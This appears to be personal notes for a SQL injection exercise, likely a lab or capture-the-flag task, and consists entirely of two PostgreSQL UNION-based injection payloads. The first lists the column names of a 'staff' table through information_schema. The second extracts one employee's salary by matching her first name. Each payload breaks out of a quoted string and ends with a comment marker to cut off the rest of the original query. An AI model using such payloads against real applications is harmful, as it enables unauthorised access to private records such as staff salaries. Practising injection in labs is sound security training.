# Get table data

```postgresql
'' UNION
SELECT column_name
FROM information_schema.columns
WHERE table_name='staff'
LIMIT 1 OFFSET 0;--
```

# Greta's Salary

```postgresql
'' UNION
SELECT salary
FROM staff
WHERE firstname LIKE '%_reta%'
LIMIT 1 OFFSET 0;--
```
